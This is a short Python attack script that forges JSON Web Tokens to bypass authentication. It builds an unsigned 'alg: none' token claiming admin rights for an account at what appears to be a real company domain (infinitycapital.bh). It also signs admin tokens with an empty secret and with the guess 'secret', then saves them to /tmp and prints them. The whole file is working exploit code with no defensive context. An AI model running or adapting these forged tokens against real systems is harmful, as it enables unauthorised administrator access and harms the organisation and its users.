#!/usr/bin/env python3
import json, base64
def b64u(x): return base64.urlsafe_b64encode(x.encode()).rstrip(b'=').decode()
t = b64u(json.dumps({"alg":"none","typ":"JWT"},separators=(',',':'))) + "." + \
    b64u(json.dumps({"sub":"1","email":"admin@infinitycapital.bh","role":"admin","isAdmin":True},separators=(',',':'))) + "."
open('/tmp/jwt_none.txt','w').write(t)
print(t)
# signed HS256 variants
import hmac,hashlib
def hs(hdr,pl,sec):
    a=b64u(json.dumps(hdr,separators=(',',':'))); b=b64u(json.dumps(pl,separators=(',',':')))
    return a+"."+b+"."+b64u(hmac.new(sec.encode(), (a+"."+b).encode(), hashlib.sha256).digest())
open('/tmp/jwt_hs_empty.txt','w').write(hs({"alg":"HS256","typ":"JWT"},{"sub":"1","role":"admin"},""))
open('/tmp/jwt_hs_secret.txt','w').write(hs({"alg":"HS256","typ":"JWT"},{"sub":"1","role":"admin"},"secret"))
print("hs_empty:", open('/tmp/jwt_hs_empty.txt').read())
print("hs_secret:", open('/tmp/jwt_hs_secret.txt').read())
